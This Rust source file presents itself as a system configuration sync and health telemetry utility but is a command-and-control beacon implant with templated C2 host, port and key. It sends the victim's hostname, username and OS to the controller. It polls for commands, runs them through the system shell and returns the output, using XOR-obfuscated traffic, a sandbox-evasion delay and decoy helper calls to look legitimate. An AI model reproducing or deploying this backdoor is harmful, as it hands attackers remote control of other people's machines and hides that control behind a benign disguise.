// System Configuration Sync Utility
// Manages endpoint configuration and health telemetry
mod ghost;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::time::Duration;
use std::thread;

const EP: &str = "{{C2_HOST}}";
const PT: &str = "{{C2_PORT}}";
const SC: &str = "{{C2_SCHEME}}";
const AK: &str = "{{ENCRYPTION_KEY}}";
const SI: u64 = {{BEACON_INTERVAL}};
const SJ: u64 = {{BEACON_JITTER}};
const P1: &str = "{{REGISTER_URI}}";
const P2: &str = "{{CHECKIN_URI}}";
const P3: &str = "{{RESULT_URI}}";
const UA: &str = "{{USER_AGENT}}";

fn xc(d: &[u8], k: &[u8]) -> Vec<u8> {
    d.iter().enumerate().map(|(i, b)| b ^ k[i % k.len()]).collect()
}

fn b6e(d: &[u8]) -> String { base64::encode(d) }
fn b6d(d: &str) -> Option<Vec<u8>> { base64::decode(d).ok() }

fn enc(pt: &str) -> String {
    let k = AK.as_bytes();
    b6e(&xc(pt.as_bytes(), k))
}

fn dec(e: &str) -> Option<String> {
    let r = b6d(e)?;
    String::from_utf8(xc(&r, AK.as_bytes())).ok()
}

fn hn() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("COMPUTERNAME").unwrap_or_default() }
    #[cfg(not(target_os = "windows"))]
    { Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().into()).unwrap_or_default() }
}

fn un() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("USERNAME").unwrap_or_default() }
    #[cfg(not(target_os = "windows"))]
    { std::env::var("USER").unwrap_or_default() }
}

fn ex(c: &str) -> String {
    if c.starts_with("cd ") {
        return match std::env::set_current_dir(c[3..].trim()) {
            Ok(_) => format!("Changed directory to {}", std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default()),
            Err(e) => format!("Error: {}", e),
        };
    }
    #[cfg(target_os = "windows")]
    let o = Command::new("cmd").args(&["/C", c]).output();
    #[cfg(not(target_os = "windows"))]
    let o = Command::new("sh").args(&["-c", c]).output();
    match o {
        Ok(r) => {
            let s = format!("{}{}", String::from_utf8_lossy(&r.stdout), String::from_utf8_lossy(&r.stderr));
            if s.is_empty() { "OK".into() } else { s }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn hp(p: &str, b: &str) -> Option<String> {
    let a = format!("{}:{}", EP, PT);
    let mut s = TcpStream::connect_timeout(&a.parse().ok()?, Duration::from_secs(30)).ok()?;
    s.set_read_timeout(Some(Duration::from_secs(60))).ok();
    let r = format!("POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", p, a, UA, b.len(), b);
    s.write_all(r.as_bytes()).ok()?;
    let mut resp = String::new();
    s.read_to_string(&mut resp).ok()?;
    resp.find("\r\n\r\n").map(|i| resp[i+4..].to_string())
}

fn jv(k: &str, v: &str, q: bool) -> String {
    if q { format!("\"{}\":\"{}\"", k, v.replace('\\', "\\\\").replace('"', "\\\"")) }
    else { format!("\"{}\":{}", k, v) }
}

fn xs(j: &str, k: &str) -> Option<String> {
    let s = format!("\"{}\":\"", k);
    j.find(&s).and_then(|i| {
        let vs = i + s.len();
        j[vs..].find('"').map(|e| j[vs..vs+e].to_string())
    })
}

fn main() {
    let _ = ghost::health_check();
    let _ = ghost::collect_system_info();
    let _ = ghost::aggregate_metrics(&[1.0, 2.0, 3.0]);
    let _ = ghost::normalize_text("test");
    let _ = ghost::format_bytes(1024);
    let _ = ghost::timestamp();
    let _ = ghost::glob_match("*.txt", "test.txt");
    let _ = ghost::json_object(&[("status", "ok")]);
    let _ = ghost::validate_email("test@example.com");
    let _ = ghost::slugify("Hello World Test");
    let _ = ghost::base64_encode_simple(b"test data");
    let _ = ghost::sha256_simple(b"fingerprint");
    let _ = ghost::sha256_hash(b"test");
    let _ = ghost::parse_url("https://example.com/test");
    let _ = ghost::regex_match(r"\d+", "123");
    let _ = ghost::current_timestamp();
    let _ = ghost::create_status_report();
    let _ = ghost::parse_csv("a,b,c\n1,2,3");
    // Start health server on random high port (legitimate service behavior)
    
    // Env check
    if std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1) < 2 {
        thread::sleep(Duration::from_secs(30));
    }

    let h = hn(); let u = un();
    let m = format!("{{\"type\":\"register\",\"metadata\":{{{},{},{},{},{}}}}}",
        jv("hostname", &h, true), jv("username", &u, true),
        jv("os", std::env::consts::OS, true), jv("mode", "beacon", true),
        jv("beacon_interval", &SI.to_string(), false));

    let mut aid = String::new();
    for _ in 0..10 {
        if let Some(r) = hp(P1, &enc(&m)) {
            if let Some(d) = dec(&r) {
                if let Some(id) = xs(&d, "agent_id") {
                    aid = id; break;
                }
            }
        }
        thread::sleep(Duration::from_secs(5));
    }
    if aid.is_empty() { return; }

    let mut pr: Vec<String> = Vec::new();
    loop {
        let rj = if pr.is_empty() { "[]".into() } else { format!("[{}]", pr.join(",")) };
        let ci = format!("{{\"type\":\"checkin\",\"agent_id\":\"{}\",\"metadata\":{{\"mode\":\"beacon\"}},\"results\":{}}}", aid, rj);
        pr.clear();

        if let Some(r) = hp(P2, &enc(&ci)) {
            if let Some(d) = dec(&r) {
                let mut sf = 0;
                while let Some(p) = d[sf..].find("\"command\":\"") {
                    let ap = sf + p + 11;
                    if let Some(e) = d[ap..].find('"') {
                        let cmd = &d[ap..ap+e];
                        if cmd == "__kill" { std::process::exit(0); }
                        let out = ex(cmd);
                        let oe = out.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r");
                        pr.push(format!("{{\"type\":\"response\",\"output\":\"{}\",\"command\":\"{}\"}}", oe, cmd));
                        sf = ap + e + 1;
                    } else { break; }
                }
            }
        }

        let base = SI;
        if SJ > 0 && SJ <= 100 {
            let jr = (base as f64) * (SJ as f64) / 100.0;
            let off = (rand::random::<f64>() * jr * 2.0) - jr;
            thread::sleep(Duration::from_secs(((base as f64 + off).max(1.0)) as u64));
        } else {
            thread::sleep(Duration::from_secs(base));
        }
    }
}
